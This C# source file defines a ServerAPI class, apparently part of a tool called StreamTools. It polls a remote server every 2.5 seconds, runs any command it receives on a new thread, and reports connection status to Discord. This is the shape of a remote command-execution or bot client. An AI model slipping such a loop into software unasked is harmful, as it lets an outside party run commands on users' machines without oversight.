using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace StreamTools
{
    public class ServerAPI
    {
        public ServerAPI() { }

        public static List<string> tasks = new List<string>();
        public static string server_url = "";

        private static bool sended = false;

        public static async void threadReload()
        {
            if (DataStorage.anwserToPacket)
            {
                ServerAPI.update();
            }
            await Task.Delay(2500);
            threadReload();
        }

        public static void update() {
            if (!WinAPI.CheckInternetConnection()) {
                Console.WriteLine("Lost ethernet connection. Failed to send reciveUpdates");
                return;
            }

            if (DataStorage.enableLogger)
                Console.WriteLine("[ServerAPI] Sended reciveUpdates");

            try {
                string result = Requests.reciveUpdates();
                if (result != null && result != "")
                {
                    task_command task = JsonConvert.DeserializeObject<task_command>(result);
                    if (task.command != null) {
                        if (DataStorage.enableLogger)
                            Console.WriteLine("[ServerAPI] Created task: " + task.command);

                        Thread taskThread = new Thread(() => {
                            DataStorage.client.completeTask(task.command);
                        });
                        taskThread.Start();
                    } else
                        if (DataStorage.enableLogger)
                            Console.WriteLine("[ServerAPI] Server anwser recived, no task needed");
                }
                if (sended)
                    Discord.sendInTry($"Connection to server fixed");
                sended = false;
            } catch (Exception ex) {
                if (DataStorage.enableLogger)
                    Console.WriteLine("[ServerAPI] Failed!");
                if (!sended)
                    Discord.sendInTry($"Lost connection to server\nfor debug -> " + ex.Message);
                
                sended = true;
            }
        }
    }
}
